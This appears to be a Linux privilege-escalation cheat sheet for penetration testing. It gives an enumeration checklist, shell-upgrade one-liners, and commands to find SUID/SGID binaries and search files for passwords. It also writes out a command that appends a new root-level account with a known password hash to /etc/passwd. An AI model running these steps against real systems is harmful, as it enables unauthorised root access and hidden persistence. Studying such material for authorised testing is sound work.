## Privilege Escalation
Manual:
1. Are you constrained by jail shell?
2. SUID and GUID?
3. What can current user do `sudo -l`?
4. What's the distro, architecture and kernel version of the machine? to find kernel exploit prioritize distro first. 
5. What's in the home directory?
6. Can you upload/download file?
7.  What processes are run by `root`?
8. Are there something interesting in the `_history` files?
9. Are there ssh keys?
10. Search for files that are named and/or contain the word `password`, `passwd`, `config` or `configuration`.
11. `netstat -antup` what's running on loopback?

Tools:
1. LinPeas

**Upgrade from jail shell:**
Check for valid tty by, well, using the command `tty`. If exist, proceed.
```
echo os.system('/bin/bash')
```
```
/bin/sh -i
```
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
stty columns 235 rows 235
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
alias ll='ls -lsaht --color=auto'
export TERM=xterm-256color
```
or
```
export TERM=xterm
```
Ctrl + ZÂ [Background Process]  
```
stty raw -echo ; fg ; reset
```

**File transfer:**
`http.server` lists file in the **current** directory.
```
python3 -m http.server 80
```
```
which wget
which curl
which fetch -> BSD based
which nc
which netcat
which ftp
which tftp
```

**SUID & GUID:**
```
find / -perm -u=s -type f 2>/dev/null
```
```
find / -perm -g=s -type f 2>/dev/null
```

**Can we write to /etc/passwd?**  
<pre style="font-size: 12px";>
openssl passwd -1<font color=gray> # generate password in md5</font>
password
$1$MKK8ZQZH$md0DR7L3sEakzoYm7aZX1/
</pre>
```
echo 'not_root:$1$MKK8ZQZH$md0DR7L3sEakzoYm7aZX1/:0:0:not_root:/home/not_root:/bin/bash' >> /etc/passwd  
```
```
su not_root  
id
```

**Find any reccurence of password**
```
KEY=password; find / -type f -name *$KEY* 2>/dev/null | grep $KEY
```